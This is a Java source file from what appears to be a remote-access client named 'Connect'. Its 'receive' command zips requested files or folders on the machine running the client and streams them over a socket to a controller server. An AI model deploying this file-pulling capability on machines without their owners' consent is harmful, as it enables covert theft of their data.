package br.com.introcdc.connect.client.commands.file.external;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 16:41
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;
import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.ClientFileComponents;

import java.io.BufferedInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.Socket;

public class ClientCommandReceive extends ClientCommand {

    public ClientCommandReceive() {
        super("receive");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input.isEmpty()) {
            msg("Digite um arquivo!");
            return;
        }
        String[] filesArray = input.split(";");
        new Thread(() -> {
            for (String inputInfo : filesArray) {
                File file = ClientFileComponents.file(inputInfo);
                boolean temp = false;
                boolean notFound = false;
                if (file.exists()) {
                    if (file.isDirectory()) {
                        temp = true;
                        msg("Pasta " + file.getName() + " sendo zipada para recebimento...");
                        File objective = ClientFileComponents.ZIP_LOCAL ? new File("file.zip") : new File(ClientFileComponents.FOLDER, "file.zip");
                        ClientFileComponents.createZip(file, objective, ClientFileComponents.FOLDER.replace("\\", "/") + "/");
                        msg("Pasta " + file.getName() + " zipada!");
                        file = objective;
                    }
                } else {
                    notFound = true;
                    msg("Arquivo não encontrado!");
                }

                if (!notFound) {
                    File fileToSend = file;
                    boolean temporary = temp;
                    msg("Enviando arquivo " + fileToSend.getName() + "...");
                    msg("receive-file");
                    Runnable runnable = () -> {
                        try (Socket fileSocket = new Socket(Connect.IP, Connect.PORT);
                             DataOutputStream dos = new DataOutputStream(fileSocket.getOutputStream());
                             BufferedInputStream bis = new BufferedInputStream(new FileInputStream(fileToSend))) {
                            dos.writeUTF("SECONDARY:" + ConnectClient.KEY + ":RECEIVE_FILE");
                            dos.writeUTF(ClientFileComponents.removeCharacters(fileToSend.getName()));
                            dos.flush();
                            byte[] buffer = new byte[4096];
                            int bytesRead;
                            while ((bytesRead = bis.read(buffer)) != -1) {
                                dos.write(buffer, 0, bytesRead);
                            }
                        } catch (Exception exception) {
                            msg("Ocorreu um erro ao enviar o arquivo: (" + exception.getMessage() + ")");
                            exception(exception);
                        }
                        if (temporary) {
                            ClientFileComponents.deleteFile(fileToSend);
                        }
                    };
                    if (filesArray.length == 1) {
                        ConnectClient.EXECUTOR.schedule(ConnectClient.runnable(() -> new Thread(runnable).start()), Connect.DELAY, Connect.DELAY_TYPE);
                    } else {
                        runnable.run();
                        try {
                            Thread.sleep(1000);
                        } catch (Exception ignored) {
                        }
                    }
                }
            }
        }).start();
    }

}
